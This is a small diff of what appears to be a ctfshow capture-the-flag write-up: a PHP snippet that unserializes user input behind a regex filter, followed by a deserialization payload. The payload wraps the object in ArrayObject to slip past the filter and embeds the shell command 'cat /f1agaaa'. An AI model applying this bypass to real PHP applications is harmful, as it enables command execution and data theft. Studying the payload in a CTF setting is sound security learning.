@@ -1,3 +1,4 @@
+~~~
 <?php
 
 /*
@@ -31,6 +32,8 @@ if(!preg_match("/^[Oa]:[\d]+/i", $data)){
     unserialize($data);
 }
 ?>
-
+~~~
 payload:
+~~~
 ?1%2b1>2=C:11:"ArrayObject":67:{x:i:0;O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";};m:a:0:{}}
+~~~
